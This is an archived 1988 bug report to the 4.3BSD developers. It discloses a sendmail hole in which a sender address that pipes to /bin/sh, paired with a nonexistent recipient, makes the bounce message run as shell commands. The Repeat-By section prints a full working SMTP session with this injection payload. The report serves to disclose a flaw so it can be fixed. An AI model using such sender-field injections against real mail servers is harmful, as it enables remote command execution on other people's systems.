@@ -1,0 +1,91 @@
+From mcdurb!mycroft!thomas@a.cs.uiuc.edu  Wed Nov 16 11:32:55 1988
+Received: from ucbvax.Berkeley.EDU by okeeffe.Berkeley.EDU (5.61/1.29)
+	id AA08417; Wed, 16 Nov 88 11:32:55 PST
+Received: from RUTGERS.EDU by ucbvax.Berkeley.EDU (5.59/1.31)
+	id AA24656; Wed, 16 Nov 88 11:30:33 PST
+Received: by rutgers.edu (5.59/1.15) 
+	id AA12729; Wed, 16 Nov 88 14:30:24 EST
+Received: by a.cs.uiuc.edu (UIUC-5.52/9.7)
+	id AA04447; Wed, 16 Nov 88 12:45:19 CST
+Date: Wed, 16 Nov 88 12:25:06 CST
+From: mcdurb!mycroft!thomas@a.cs.uiuc.edu (Tim Thomas )
+Received: by mycroft (5.54/)
+Message-Id: <8811161825.AA03872@mycroft>
+To: 4bsd-bugs@ucbvax.Berkeley.EDU
+Subject: sendmail security hole worse than debug mode
+
+Index:	usr.lib/sendmail 4.3BSD
+
+Description:
+	There is still a very serious security hole in sendmail, akin to the
+	sendmail debug problem.  Basically I can do the same things as the
+	recent sendmail worm but without a need for debug mode.  The problem is
+	a bit more insidious and quite a bit more difficult to close.
+
+	The problem is summarized as follows.  I can mail to a program by
+	mailing *from* the program and mailing *to* a bogus user.  Sendmail will
+	notice that the recipient doesn't exist and queue return mail to the
+	sender indicating this fact.  However, if the "person" who sent the mail
+	is a program, then sendmail will send the mail to that program!!!  This
+	is clearly indicated with the following script.
+
+Repeat-By:
+
+================================================================================
+Script started on Wed Nov 16 11:51:31 1988
+% telnet localhost 25
+Trying...
+Connected to localhost.
+
+Binary mode:off
+Escape character is '^]'.
+220 mycroft Sendmail 5.54/4.7 ready at Wed, 16 Nov 88 11:51:42 CST
+mail from:"|sed -e '1,/^\Z\Z$/d' | /bin/sh"
+250 "|sed -e '1,/^\Z\Z$/d' |/bin/sh"... Sender ok
+rcpt to:zargon6
+550 zargon6... User unknown
+data
+354 Enter mail, end with "." on a line by itself
+ZZ
+echo "This demonstrates that a problem still exists with sendmail" > /tmp/zzzzz
+echo "This one however is going to be harder to close because" >> /tmp/zzzzz
+echo "it is harder for sendmail to detect this case" >> /tmp/zzzzz
+..
+554 "|sed -e '1,/^\Z\Z$/d' |/bin/sh"... Cannot mail directly to programs
+quit
+221 mycroft closing connection
+Connection closed by foreign host.
+% mailq
+                Mail Queue (1 request)
+--QID-- --Size-- -----Q-Time----- ------------Sender/Recipient------------
+AA02626      227 Wed Nov 16 11:52 "|sed -e '1,/^\Z\Z$/d' |/bin/sh"
+                                  zargon6
+% /usr/lib/sendmail -q
+qfAA02626: line 5: zargon6... User unknown
+% mailq
+                Mail Queue (1 request)
+--QID-- --Size-- -----Q-Time----- ------------Sender/Recipient------------
+AA02638      566 Wed Nov 16 11:53 MAILER-DAEMON
+                                  "|sed -e '1,/^\Z\Z$/d' |/bin/sh"
+% /usr/lib/sendmail -q
+% ls /tmp/zzzzz
+/tmp/zzzzz
+% more /tmp/zzzzz
+This demonstrates that a problem still exists with sendmail
+This one however is going to be harder to close because
+it is harder for sendmail to detect this case
+% exit
+
+script done on Wed Nov 16 11:54:00 1988
+================================================================================
+
+By examining the script session you will notice that *even though* sendmail is
+generating error messages (eg. "550 zargon6... User unknown"), the request is
+still queued!
+
+I leave it up to you to figure out an appropriate fix.  This one should be
+interesting...
+
+--------------------------------------------------------------------------------
+Tim Thomas		(217) 384-8718	uucp: uunet!uiucuxc!mcdurb!thomas
+Motorola Inc., CUDC	Urbana, IL	arpa: thomas@xenurus.gould.com
